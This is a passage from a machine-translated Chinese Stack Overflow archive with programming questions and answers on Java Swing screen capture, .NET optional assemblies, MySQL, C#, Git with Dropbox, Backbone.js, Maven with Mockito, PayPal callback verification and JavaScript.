robot.createScreenCapture(SCREEN_RECT); 
```

我试图将其缩小为 600X400 的图像并适合 600X400 的 JFrame 我的程序正在使用摇摆工人从每张图片或帧中创建视频。每个帧有 200 毫秒的延迟。当被告知重新缩放时，图像仅以原始尺寸显示原始图像。有谁知道如何解决这个问题，还是我应该放弃调整大小？

```
@SuppressWarnings("serial")
public class temporaryShit extends JPanel 
{
    private static final int width = 600;
    private static final int height = 400;
    private JLabel displayedLabel = new JLabel();

    public temporaryShit() 
    {
        setLayout(new BorderLayout());
        add(displayedLabel);
        try {
            MySwingWorker mySwingWorker = new MySwingWorker();
            mySwingWorker.execute();
        } catch (AWTException e) {
        }
    }

    public void setLabelIcon(Icon icon) {
        displayedLabel.setIcon(icon);
    }

    @Override
    public Dimension getPreferredSize() {
        return new Dimension(width, height);
    }

    private class MySwingWorker extends SwingWorker<Void, Icon> 
    {
        private final Rectangle SCREEN_RECT = new Rectangle(0, 0, width, height);
        private long delay = 200;
        private Robot robot = null;

        public MySwingWorker() throws AWTException 
        {
            robot = new Robot();
        }

        @Override
        protected Void doInBackground() throws Exception 
        {
            Timer utilTimer = new Timer();
            TimerTask task = new TimerTask() 
            {
                @Override
                public void run() 
                {
                    BufferedImage capturedImage = captureScreen();
                    publish(new ImageIcon(capturedImage));
                }
            };
            utilTimer.scheduleAtFixedRate(task, delay, delay);
            return null;
        }

        @Override
        protected void process(List<Icon> chunks) 
        {
            for (Icon icon : chunks) 
            {
                setLabelIcon(icon);
            }
        }

        private BufferedImage captureScreen() 
        {
            BufferedImage img = robot.createScreenCapture(SCREEN_RECT);
            return createResizedImage(img, width, height);
        }

        public BufferedImage createResizedImage(Image original, int width, int height) 
        {
            BufferedImage scaledBI = new BufferedImage(width, height, BufferedImage.TYPE_INT_ARGB);
            Graphics2D g = scaledBI.createGraphics();
            g.setRenderingHint(RenderingHints.KEY_INTERPOLATION, RenderingHints.VALUE_INTERPOLATION_BILINEAR);
            g.drawImage(original, 0, 0, width, height, null);
            g.dispose();
            return scaledBI;
        }
    }

    private static void createAndShowGui() 
    {
        temporaryShit mainPanel = new temporaryShit();

        JFrame frame = new JFrame("SwingWorker Eg");
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.getContentPane().add(mainPanel);
        frame.pack();
        frame.setLocationByPlatform(true);
        frame.setVisible(true);
    }

    public static void main(String[] args) 
    {
        SwingUtilities.invokeLater(new Runnable() 
        {
            public void run() 
            {
                createAndShowGui();
            }
        });
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-20T16:24:18.950

您已经有了一个指定大小的新图像 - `scaled`，可用于渲染。

这是一个简单的例子：

![在此处输入图像描述](https://i.stack.imgur.com/9fDbD.png)

```
import java.awt.Image;
import java.awt.image.BufferedImage;
import java.net.URL;
import javax.imageio.ImageIO;
import javax.swing.*;

class TestBrightness {
    public static void main(String args[]) {
        try {
            URL imageUrl = new URL(
                    "http://duke.kenai.com/comfyChair/ComfyChairRadSmall.jpg");

            BufferedImage ioImage = ImageIO.read(imageUrl);

            JPanel panel = new JPanel();
            Image scaledImg = ioImage.getScaledInstance(ioImage.getWidth() / 2, 
                    ioImage.getHeight() / 2, Image.SCALE_SMOOTH);

            panel.add(new JLabel(new ImageIcon(ioImage)));
            panel.add(new JLabel(new ImageIcon(scaledImg)));

            JOptionPane.showMessageDialog(null, panel, "100% vs 50%",
                    JOptionPane.INFORMATION_MESSAGE);

        } catch (Exception e) {
            JOptionPane.showMessageDialog(null, e.getMessage(), "Failure",
                    JOptionPane.ERROR_MESSAGE);
            e.printStackTrace();
        }
    }
} 
```

作为旁注，有很多方法可以缩放图像，`Image.getScaledInstance()`可能不是最好的。您可能有兴趣查看[Image.getScaledInstance() 的风险，](https://today.java.net/pub/a/today/2007/04/03/perils-of-image-getscaledinstance.html)了解有关`Image.getScaledInstance()`

***编辑：问题更新***

最后一个问题更新删除了有关此答案的所有详细信息`getScaledInstance`并使该答案无效。`getScaledInstance`是一个非常慢的方法，它也是异步的。试试这个方法来获得一个调整大小的图像：

```
public static BufferedImage createResizedImage(Image original, int width,
        int height) {
    BufferedImage scaledBI = new BufferedImage(width, height,
            BufferedImage.TYPE_INT_ARGB);
    Graphics2D g = scaledBI.createGraphics();
    g.setRenderingHint(RenderingHints.KEY_INTERPOLATION,
            RenderingHints.VALUE_INTERPOLATION_BILINEAR);
    g.drawImage(original, 0, 0, width, height, null);
    g.dispose();
    return scaledBI;
} 
```

您可能想要更改渲染提示以获得更好的质量。

要获得更好、更完整的图像缩放器，请查看*Filthy Rich Clients*书中 的[getFasterScaledInstance()](http://www.java2s.com/Code/Java/2D-Graphics-GUI/PictureScaler.htm)。

 ****编辑：最后一个问题更新与发布的代码和 SwingWorker***

执行`SwingWorker`不正确。`doInBackground()`时间表`java.Utils.Timer`。此计时器处理所有更新，而实际的`SwingWorker`工作线程结束。计时器的所有更新都不是在*Event Dispatch Thread*上触发的。`ImageIcon`不在 EDT上分配可能不安全。并且可以肯定更新 UI 是不安全的，即`setLabelIcon()`不在 EDT 上调用。有关详细信息，请参阅[Swing 中的并发](http://docs.oracle.com/javase/tutorial/uiswing/concurrency/index.html)教程。

您可以添加`while`循环和删除计时器`Thread.sleep`。`doInBackground()`或者，Swing 计时器可能更适合这种情况。这是一个例子：

```
import java.awt.*;
import javax.swing.*;
import java.awt.event.*;
import java.awt.image.BufferedImage;

public class DemoRobotPanel extends JPanel{
    private static final long serialVersionUID = 1L;

    private Image image;
    private Robot robot;
    private Rectangle CAPTURE_RECT;
    private int TIMER_DELAY = 1000;
    private int desiredWidth = 600;
    private int desiredHeight = 400;

    public DemoRobotPanel() {
        CAPTURE_RECT = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());

        try {
            robot = new Robot();

            ActionListener taskPerformer = new ActionListener() {
                public void actionPerformed(ActionEvent evt) {
                    try {
                        BufferedImage img = robot.createScreenCapture(CAPTURE_RECT);
                        setImage(img);
                    } catch (HeadlessException e) {
                        e.printStackTrace();
                    }
                }
            };

            Timer timer = new Timer(TIMER_DELAY, taskPerformer);
            timer.start();

        } catch (AWTException ex) {
            // TODO Auto-generated catch block
            ex.printStackTrace();
        }
    }

    @Override
    public Dimension getPreferredSize() {
        return new Dimension(desiredWidth, desiredHeight);
    }

    public void setImage(Image image) {
        this.image = image;
        repaint();
    }

    @Override
    public void paintComponent(Graphics g) {
        super.paintComponent(g);
        if (image != null)
            g.drawImage(image, 0, 0, getWidth(), getHeight(), this);
    }

    private static void createAndShowGui()  {
        final DemoRobotPanel panel = new DemoRobotPanel();
        JFrame frame = new JFrame("Demo");
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.getContentPane().add(panel);
        frame.pack();
        frame.setLocationByPlatform(true);
        frame.setVisible(true);
    }

    public static void main(String[] args) {
        SwingUtilities.invokeLater(new Runnable() {
            public void run() {
                createAndShowGui();
            }
        });
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T17:27:11.357

尝试这个：

```
 public BufferedImage resize(BufferedImage bufferedImage, int resizeWidth, int resizeHeight) {
        // Create new (blank) image of required (scaled) size
        BufferedImage scaledImage = new BufferedImage(resizeWidth, resizeHeight, BufferedImage.TYPE_INT_ARGB);
        // Paint scaled version of image to new image
        Graphics2D graphics2D = scaledImage.createGraphics();
        graphics2D.setRenderingHint(RenderingHints.KEY_INTERPOLATION, RenderingHints.VALUE_INTERPOLATION_BILINEAR);
        graphics2D.drawImage(bufferedImage, 0, 0, resizeWidth, resizeHeight, null);
        graphics2D.dispose();
        return scaledImage;
    } 
```

您可能想尝试不同的 RenderingHints。*

# .net - 如何引用可能丢失的 dll

> ID：16122264
> 
> 赞同：1
> 
> 时间：2013-04-20T15:53:47.667
> 
> 标签：.net, dll, reference, dotnetnuke

我们有一个学习管理系统，它作为一个模块集安装到 DotNetNuke 框架中。我们想为我们的 LMS 添加一些扩展，这些扩展利用了第三方模块提供的一些 API 调用。第三方模块非常昂贵，并非我们所有的客户都愿意购买。因此，如果第三方模块不存在，我们将不得不使扩展成为可选并禁用它们。

这是我的问题。我们如何构建我们的软件，以便它可以在存在或不存在第三方 DLL 的情况下运行？如果我们为 API 方法引用第三方 DLL，那么我认为如果没有安装第三方模块，即使我们禁用了这些功能，也会出现运行时错误。

对于没有安装第三方模块的客户端，我们如何避免运行时错误？

谢谢，克里斯

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T20:13:40.350

如果您不执行任何调用程序集的代码，您的应用程序将在没有程序集的情况下运行。即使没有做任何反射技巧。

我过去通过保证没有代码调用依赖注入和应用程序启动时的第 3 方程序集，不注册任何引用第 3 方的实现来做到这一点。相反，注册一个不同的实现或存根实现。

或任何其他保证不调用调用第三方的代码的方法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T19:11:16.297

您可能需要**Reflection**，而不是在编译时使用“添加引用”来引用第三方 DLL，而是在运行时使用 Assembly.Load 方法动态加载它。

如果客户端已安装所需的框架 - 做任何你需要的，如果没有 - 没有编译或其他错误。

# java - 摇摆作曲示范

> ID：16122265
> 
> 赞同：2
> 
> 时间：2013-04-20T15:53:54.527
> 
> 标签：java, swing, composition

我目前正在攻读 Java 编程课程以攻读学位，虽然我已经对基本的编程概念有点熟悉，但在这门课程之前我从未专门使用过 Java。为了努力成为一名更好的程序员，我已经独立研究了每个作业和章节所涵盖的主题，并且有几次我在书中发现了一些似乎违反公认标准的做法（使用双精度表示货币，等）并最终从第三方信息中学习更多，以尝试编写更好的代码。

当前章节介绍了 Swing 和 GUI 的创建，但它非常明确地建议使用继承来扩展 Swing 类，而完全没有提及使用组合，这是最基本的搜索（在 StackOverflow 和其他地方）似乎建议的成为更有效的解决方案。因此，本章中的示例都没有涉及使用组合来创建和实现 Swing GUI。

谁能指导我使用任何建议的在线资源，这些资源提供正确编写的初学者级示例/使用组合实现的 Swing GUI 演示？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T16:25:07.250

仅评论，而不是答案，对 OP 的问题和基于她/他的书的知识

最简单的例子是用 JPanel 和 JButton 创建 JFrame

* * *

作品

为每个 JComponents 创建一个带有局部变量的类

或者

三个类，返回 JFrame、JPanel、JButton

* * *

遗产

三个班级

第一类扩展 JFrame

第二类扩展JPanel

第三类扩展 JButton

或者

另一个动物园

* * *

现在的问题是如何更改为两种方式创建的对象的背景，组合和继承

# actionscript-3 - 在 Flash AS3 中使用客场 3D 制作跷跷板/斩波动作

> ID：16122270
> 
> 赞同：0
> 
> 时间：2013-04-20T15:54:03.433
> 
> 标签：actionscript-3, flash-builder, accelerometer, away3d

我正在尝试根据我的平板电脑的加速度计进行斩波动作，并使用 away3D 框显示它。基本上每次用户在加速时摇动设备时我想要做的就是盒子向上移动然后立即向下移动。想一想切刀的动作。现在我有以下代码，但它似乎取消了自己，只是留在同一个地方。任何帮助将非常感激！

```
protected function onAccUpdate(event:AccelerometerEvent):void{
            var threshold:Number = 1.5;
            if(event.accelerationY > threshold){
                targetY = event.accelerationY *10;
                knife.y += targetY;
                trace(knife.y);
                if (knife.y >0){
                    knife.y -= targetY; 
                    trace(knife.y);
                } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-21T14:47:03.010

`knife.y += targetY;`在您的函数的执行顺序中，一旦您设置`if (knife.y >0)`返回 true 并将knife.y 设置回原始位置。因此，这把刀看起来好像从未动过。

您应该使用 onEnterFrame 更新函数来将刀缓到目标位置。如果刀需要将 set targetY 移动到新位置，则在您的 onAccUpdate 函数中。在您的更新函数中，一旦刀到达新位置，将 targetY 设置为 0 并为刀设置动画。

这是 onEnterFrame 代码的示例：

```
var diff:Number = targetY - knife.y;
knife.y += diff * 0.05; // 0.05 is to ease/smooth the animation
if( Math.abs( diff ) <= 1 ) targetY = 0; // we reached the target position, now go back to 0 
```

# mysql - 字段长度对查询时间的影响

> ID：16122273
> 
> 赞同：0
> 
> 时间：2013-04-20T15:54:07.067
> 
> 标签：mysql, sql

我有一个 mysql 数据库，在其中保存项目信息并保存描述。

问题是描述列最多可以容纳 150 个字符，我认为这很长，我想知道它是否会减慢查询时间。另外我想知道是否建议缩短 int 的大小我的意思是如果我的价格通常不是那么大，我应该将列限制为小/中 int 吗？

列是这样的：

```
id   name   category   publisher   mail   price   description 
```

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T18:18:16.363

将您的字符数据存储为`varchar()`而不是存储，`char()`并阅读有关这些数据类型的 MySQL 文档（[此处](http://dev.mysql.com/doc/refman/5.5/en/char.html)）。这仅将字符实际存储在描述中，加上更多字节的开销。

至于较长的字段是否意味着性能较差的查询。这是一个复杂的话题。显然，在极端情况下，与 10 字节的记录相比，拥有最大大小的记录会减慢速度。原因与 I/O 性能有关。MySQL 读入页面，一个页面可以包含一条或多条记录。然后处理页面上的记录。

适合页面的记录越多，I/O 就越少。

但随后它变得更加复杂，具体取决于硬件和存储引擎。如今，磁盘和操作系统一样进行预读。因此，下一次读取页面（如果页面没有碎片并且彼此相邻）可能会比读取初始页面快得多。事实上，在第一页的处理完成*之前，您可能已经在内存中拥有下一页。*那时，每页​​上有多少条记录并不重要。

而且，200 字节的记录并不是很大。您应该首先担心让您的应用程序正常工作，然后再让其满足性能目标。在此过程中，做出合理的选择，例如使用适当大小的数字`varchar()`代替`char()`（您可能会考虑使用定点数字类型而不是浮点数来表示货币值）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T16:35:57.333

只有您认为 150 长 - 数据库很可能不会，因为它们旨在一次处理更多。**不要考虑为了“性能”而牺牲数据。**如果您的应用程序的性质要求您一次存储多达 150 个字符的文本，请不要害怕这样做，但请查看优化提示。

但是，使用正确的数据类型可以帮助您节省空间。例如，如果您有一个用于存储值 0 到 20 的字段，则不需要 INT 字段类型。一个 TINYINT 就可以了。

该[文档](http://dev.mysql.com/doc/refman/5.0/en/data-types.html)列出了数据类型，并提供了有关它们使用多少空间以及如何管理它们的信息。

# c# - 搜索用户变量的文本文件 - 此代码有什么问题

> ID：16122276
> 
> 赞同：1
> 
> 时间：2013-04-20T15:54:42.327
> 
> 标签：c#, file, variables, search, text

尝试根据用户变量条目从文本文件中读取

我的条目有名称“Big Fred”的变体（大写/小写）

代码运行，但我没有得到任何结果。

我笔记本电脑上的代码指向我从下面的代码中删除的特定位置。

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;

namespace ReadTextFileWhile
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Enter the name you wish to search for: ");                       //Prompt user for the name they wish to search for
            string x = Console.ReadLine();                                                      //assign the name the user inputs as their search parameter to the value of x
            StreamReader myReader = new StreamReader("C:/insert location here");      //Read the the text file at this location and assign to myReader
            string line = "";                                                                   //asssign 'nothing' to line.

            while (line != null)                                                                //while line in the text file is not null (empty)
            {
                line = myReader.ReadLine();                                                     //pass contents of myReader to line
                if (line != null && line == x)                                                  //if contents of line are not null and equal to the variable in x print to screen
                    Console.WriteLine(line);
            }

            myReader.Close();                                                                   //close myReader properly
            Console.ReadLine();                                                                 //Readline to keep console window open allowing a human to read output.

        }
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T15:59:06.953

尝试使用[string.IndexOf](http://msdn.microsoft.com/en-us/library/system.string.indexof.aspx)及其排除大小写差异的重载

```
line = myReader.ReadLine();                                                     
if (line != null && line.IndexOf(x, StringComparison.CurrentCultureIgnoreCase) >= 0)
      Console.WriteLine(line); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-20T16:09:42.410

您只想以不区分大小写的方式正确匹配字符串。您可以使用 .Equals

```
if (line.Equals(x,StringComparison.InvariantCultureIgnoreCase)); 
```

另一件事是：-您可以使用

```
String.IsNullOrWhiteSpace(line) or String.IsNullOrEmpty(line) 
```

而不是检查是否为空

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-21T12:01:45.990

您从文本文件中获取每一行的原因非常简单。您可能从网页或其他地方复制了文本内容。并且每一行都没有被换行符分隔，无论是 \n 还是 Environment.NewLine。因此，您需要 d 打开文件并在每行后按 Enter 键手动插入新行或从文件中读取所有测试并用点 [.] 分隔符拆分它并使用上面的代码单独处理它。我遇到了同样的问题，现在它工作正常。

# git - Git + GitHub + Dropbox

> ID：16122278
> 
> 赞同：3
> 
> 时间：2013-04-20T15:55:10.283
> 
> 标签：git, github

我是`git`GitHub 的新手。到目前为止，我设法设置了我的环境，以便我可以通过该`git`程序将提交推送到 GutHub。

我有两台电脑，它们使用 Dropbox 共享文件。这也是我保留我的开发项目的地方。我想知道的是：有没有办法同时使用`git`、GitHub**和**Dropbox？我*没有*通过 GitHub就阅读了使用指南`git`和 Dropbox 。

 *在一个实际的例子中：假设我在笔记本电脑上的一个项目文件夹中（项目文件夹在 Dropbox 上）。我`git push origin master`和一切都很好，在 GitHub 上更新。现在我的桌面上有更新的文件，通过 Dropbox 同步。

我应该`git pull`从 GitHub 获取最新版本吗？

# 编辑

很多人认为我在问如何`git`与 Dropbox 一起使用。我不是。

我要问的是如何将你的工作保存在 Dropbox 中，`git`无论如何都可以使用，**并且**有时仍然能够推送到 GitHub。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-20T20:22:34.937

好的，我将把它分解成它的组成问题：

**1.我应该使用`git pull`吗？**

如果这两台计算机是您用来修改此代码库的唯一计算机，并且没有其他人正在推送到远程存储库，则没有理由（除了良好的做法）`git pull`在这种情况下运行。您的 Dropbox 负责保持您的代码同步，您的 Github 将向全世界提供您的代码。

**2\. 怎么`git push`办？**

Dropbox won't affect this, your .git folder and .gitignore file are the components which define what will be pushed. Dropbox will be invisible to the whole process UNLESS you try to `git push` half way through a Dropbox synchronize job in which case you could end up with some consistency issues.

**3\. Are there any advantages?**

I don't think Dropbox really gives you very much here as you're using Github. Having said that, I use a similar setup with a NAS drive connected to my home computers, I just use my `svn` (I've been meaning to move to `bzr` but keep failing to do it) to update when I'm on the road.*

# backbone.js - 骨干.js点击不触发

> ID：16122279
> 
> 赞同：0
> 
> 时间：2013-04-20T15:55:28.877
> 
> 标签：backbone.js

我们已经研究并尝试了所有我们能找到的东西，但看不出为什么按钮点击甚至没有触发。如果我们更改视图渲染 html 颜色，它会显示更改，因此视图渲染工作正常，但单击登录按钮时 -> 什么也没有。js 控制台中没有显示错误。试过了

`button#login_button`和`#login_button`-`login_button`什么都没有。我们缺少什么？感谢任何帮助

```
 SessionView = Backbone.View.extend({
    el: ('#session'),
    initialize:function () {
        this.render();
    },
    render:function () {
      if (!session) {
        $(this.el).html(
          "<button id=\"login_button\" class=\"login_button black\">"+
          "Login"+
          "</button>");
        return this;
      } else {
        $(this.el).html(
          "<button id=\"logout_button\" class=\"login_button black\">"+
            "Logout</button>");
        return this; 
      }
    },
    events: {
        "click login_button" : "login",
        "click logout_button": "logout"
    },
    login: function(){
      alert("login");
      console.log("login dialog");
      //var loginView = new LoginView();
      //loginView.render().showModal();
    },
    logout: function(){
      alert("You Have Logged Out");
    }

  }); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-20T16:08:36.620

您应该在选择器中保留“#”：

```
events: {
        "click #login_button" : "login",
        "click #logout_button": "logout"
    } 
```

**更新**

您是否等待 DOM 准备好在`new`此 Backbone 视图类上使用？您的按钮被`html`调用更改的事实意味着您这样做了。

一旦您检查了这一点，您就必须使用`this.$el`而不是`$(this.el)`.

如果它仍然不起作用，请搜索事件阻止并确保 id 是唯一的。

这个非常简单的[JSFiddle](http://jsfiddle.net/s7XEr/1/)适用于您告诉我们的相同条件。

# java - Maven没有看到Mockito测试？

> ID：16122283
> 
> 赞同：4
> 
> 时间：2013-04-20T15:55:41.750
> 
> 标签：java, maven, testing, mockito

我正在用 maven 构建我的包（运行没有问题），然后我尝试为一个类进行 Mockito 测试。

pom.xml中的依赖如下：

```
<dependencies>
  <dependency>
  <groupId>org.apache.maven</groupId>
  <artifactId>maven-project</artifactId>
  <version>2.0.6</version>
  <scope>test</scope>
</dependency>
    <dependency>
     <groupId>org.mockito</groupId>
    <artifactId>mockito-all</artifactId>
    <version>1.9.5</version>
    <scope>test</scope>
    </dependency>
  </dependencies>
</project> 
```

模拟测试看起来像这样：

```
package Person;

import static org.mockito.Mockito.*;
import java.io.IOException;

public class AppTest {

public void test() throws IOException{
PersonManagement mockedPM = mock(PersonManagement.class); 
//automatically creates an instance variable of type person

mockedPM.updatePerson("test","test");
//updates this.person
verify(mockedPM).updatePerson("test","test");
}
} 
```

启动 mvn package 后，测试结果显示，没有运行测试（包含测试的文件被找到并识别，因为当我把语法错误放在那里时，编译器会识别这些）

我会很感激任何帮助，谢谢

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-20T16:02:20.690

Mockito 不是一个测试框架。这是一个模拟 API。使用 JUnit 或 TestNG。这些是测试框架。两者都只需要在测试方法上放置一些注释。

当然，您的 JUnit 或 TestNG 测试将在内部使用 Mockito API 来模拟依赖项。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-21T14:07:47.813

Mockito 是一个用于模拟对象的框架，而 JUnit 是一个用于单元测试的框架。

看起来您正在尝试它的工作原理。我建议从阅读 JUnit 开始，当你觉得你可以控制它时，回到 mocking 的工作原理。

这是 JUnit 的依赖项：

```
<dependency>
    <groupId>junit</groupId>
    <artifactId>junit</artifactId>
    <version>4.6</version>
</dependency> 
```

添加并导入后，您可以使用 @Test 注释测试

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-20T16:04:36.437

@JB Nizet 告诉你正确答案。您需要使用 @org.junit.Test 注释该方法

# c# - 提前检查空数组元素

> ID：16122285
> 
> 赞同：2
> 
> 时间：2013-04-20T15:55:55.150
> 
> 标签：c#, arrays, null

如果我正在使用以下方法检查数组的内容：

```
boardArray[xIn][yIn] 
```

我期待有一个元素，我如何预先检查那里是否没有元素/对象？非常愚蠢的问题，我知道一个明显的答案。

我正在尝试调试我的代码，它期望这里有一些东西。我想预先检查它并报告程序正在运行而不是让它崩溃。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-20T15:58:29.200

```
if(boardArray[xIn][yIn] == null)
//Skip it, do something, print it, whatever you gotta do 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-20T17:57:58.460

首先，我想从您没有问过但可能与您的问题相关的问题开始：

我建议使用[多维](http://msdn.microsoft.com/en-us/library/2yd9wwz4.aspx)数组，而不是[锯齿状数组](http://msdn.microsoft.com/en-us/library/2s05feca.aspx)。例如：

```
BoardSquare[,] boardArray = new BoardSquare[8, 8]; 
```

很可能您正在处理矩形板，因此您不需要[锯齿状数组](http://msdn.microsoft.com/en-us/library/2s05feca.aspx)。

我之所以这么说，是因为它使检查`null`更容易一些。使用锯齿状数组，其中任何一个都可以是`null`：

*   `boardArray`
*   `boardArray[xIn]`
*   `boardArray[xIn][yIn]`

使用二维数组，只有两种可能性：

*   `boardArray`
*   `boardArray[xIn, yIn]`

因此，检查变得容易一些：

```
if (boardArray != null && boardArray[xIn, yIn] != null)
{
    // Do stuff
} 
```

`boardArray`如果可以从初始化代码中证明，假设不为空并跳过此检查可能是完全有效的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-20T16:00:48.250

如果你不想对空值做任何事情，

```
if(!(boardArray[xIn][yIn]==null)) {

// Your operations here 

} 
```

您可以处理在 else 部分中如何处理空值，它可以是可选的

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-22T00:49:13.890

除了接受的答案（正确的）之外，您还想检查可能为空的数组对象的任何级别上的空值。

取决于您如何进行检查并需要信息，您可以这样做

```
if (boardArray != null && boardArray[xIn] != null && boardArray[xIn][yIn] != null){
    // all is good, do what must be done here
} 
```

如果您正在循环它们，您可以使用 linq 删除循环中的空项。它会是这样的（我没有在我面前打开 IDE，所以语法可能有点不对。请原谅我。

```
foreach(var instance in boardArray[xIn].Where(x => x != null).Select(x => x).ToList()){
    // instance is the not nulled value.
} 
```

我提出 linq 的想法是为了表明有多种方法可以做你想做的事，具体取决于具体情况。

祝你好运，编码愉快

# paypal - PayPal Payments Advanced - 验证发送到确认和取消页面的参数

> ID：16122293
> 
> 赞同：4
> 
> 时间：2013-04-20T15:56:23.120
> 
> 标签：paypal

我正在使用带有 TEMPLATE=TEMPLATEC 的 PayPal Payments Advanced。我已经想出了如何创建 IFRAME 并接收来自 PayPal 的确认/取消/silent_post 响应。但是我发现无法验证我的确认/取消/silent_post 页面收到的参数。有没有办法确保这些参数来自 PayPal 而不仅仅是由任意用户发送？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-23T14:25:19.407

关于您的最佳选择是`TRXTYPE=I`在显示 iframe 之前针对您从 PayPal 收到的安全令牌和安全令牌 ID 运行查询交易 ( )。如果事务已运行，该调用将为您提供事务中的事务 ID (PNREF)。（根据您的情况，PNREF 可能就是您所需要的。）如果与买家发回给您的 PNREF 相匹配，那么其余数据很可能是真实的。

例如：

要求： `USER=****&VENDOR=****&PARTNER=****&PWD=****&TRXTYPE=I&SECURETOKEN=7tGDq6ILZeEmATCwTXrSRkwjz&SECURETOKENID=76ac5819ee01475daf15b2af038da977&VERBOSITY=HIGH`

回复： `RESULT=0&PNREF=E79P4ABEC9DE&TRANSSTATE=8&ORIGRESULT=0&ORIGPNREF=E19P4BFB14B2&RESPMSG=Approved&AUTHCODE=111111&AVSADDR=Y&AVSZIP=Y&CVV2MATCH=Y&ORIGPPREF=1XR06058R58346646&CORRELATIONID=bdd79cb3c7fb6&PROCAVS=X&PROCCVV2=M&SETTLE_DATE=2013-04-23 07:22:06&TRANSTIME=2013-04-23 07:22:06&LASTNAME=NotProvided&AMT=24.99&ACCT=3698&EXPDATE=1214&CARDTYPE=0&IAVS=N`

`ORIGRESULT`是原始交易的结果（`0`是成功的；其他的都是失败的。）

`ORIGPNREF`是原始交易的 PNREF。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-05-22T22:32:50.003

您还可以在您的静默帖子 URL 中放置一个长而独特的“令牌”参数。就像是

> “http://www.my-web-site.com/confirm-payment?token=2348349u21034ms39n899”

并将其与服务器端脚本所期望的相同令牌匹配。由于静默帖子 URL 存储在您的 PayPal 经理帐户中，因此令牌是机密的，甚至整个 URL 也是机密的。此外，交易信息也会传递到此静默帖子 URL，允许您将信息与结帐时保存在数据库中的交易进行匹配。这是确认付款是否正确的一种很好的安全方法。无声帖子适用于付款高级 iframe（又名托管结帐页面）上的“使用贝宝付款”和“直接信用卡付款”方法。此外，您还可以再进行一次检查，以查看 PayPal 是否为[$_SERVER['HTTP_REFERER'];](https://stackoverflow.com/questions/4118000/source-of-request) （当然不能仅靠它自己信任）。

# javascript - 复制值后如何淡出textarea？

> ID：16122294
> 
> 赞同：1
> 
> 时间：2013-04-20T15:56:38.043
> 
> 标签：javascript, jquery, copy, textarea, fadeout

我有这个基本的 HTML 代码：

```
<textarea id="textarea" cols="30" rows="10">This is sample value</textarea> 
```

如何`Ctr + C`在选择或右键单击并复制文本`This is sample value`区域中的文本后用户按下 1 秒后淡出文本区域？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-20T15:59:27.740

您可以将 jQuery`copy`事件与`setTimeout`函数一起使用：

```
$('#textarea').on('copy', function() {    
    setTimeout(function() {
        $('#textarea').fadeOut();
    }, 1000);
}); 
```

**[小提琴](http://jsfiddle.net/XRTV8/)**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T16:42:49.467

我假设如果用户改变主意，您还想取消淡出：

```
$('#textarea').on('copy focus', function(e) {
    switch (e.type){
        case 'copy':
            $(this).blur().delay(1000).fadeOut();
            break;
        case 'focus':
            $(this).stop(true, false).css({ 'opacity': '1' });
            break;
    }
}); 
```

[小提琴](http://jsfiddle.net/atombob/k3U75/)

# javascript - 在 for 循环中哪个更快，使用临时变量或索引访问值？

> ID：16122301
> 
> 赞同：0
> 
> 时间：2013-04-20T15:58:11.897
> 
> 标签：javascript, performance

我正在尝试优化一些淘汰赛 js 代码，我想知道哪个会更快，即使用索引器访问变量，如下所示：

```
 for (var i = 0; i < data.length; i++) {     

            data[i].MediaID = ko.observable(data[i].MediaID);
            data[i].MediaName= ko.observable(data[i].MediaName);
            data[i].MediaTypeID= ko.observable(data[i].MediaTypeID);

        } 
```

或声明一个临时变量。

```
 for (var i = 0; i < data.length; i++) {             
            var temp = data[i];

            temp.MediaID = ko.observable(temp.MediaID);
            temp.MediaName= ko.observable(temp.MediaName);
            temp.MediaTypeID= ko.observable(temp.MediaTypeID);

        } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-20T16:00:09.690

使用临时变量访问应该稍微快一些，因为您不需要在数组中查找元素。

然而，收益将是微乎其微的

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T16:06:57.370

相比

```
 data.a.b.c.d.e.f.g.MediaID = ko.observable(data.a.b.c.d.e.f.g.MediaID);
        data.a.b.c.d.e.f.g.MediaName= ko.observable(data.a.b.c.d.e.f.g.MediaName);
        data.a.b.c.d.e.f.g.MediaTypeID= ko.observable(data.a.b.c.d.e.f.g.MediaTypeID); 
```

和

```
 var temp =data.a.b.c.d.e.f.g;

        temp.MediaID = ko.observable(temp.MediaID);
        temp.MediaName= ko.observable(temp.MediaName);
        temp.MediaTypeID= ko.observable(temp.MediaTypeID); 
```

你不需要多次查找相同的东西

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-20T16:07:25.600

如果你想要更快，你还应该缓存 data.length

```
for(var i = 0, len = data.length; i < len; i++)... 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-20T16:08:02.443

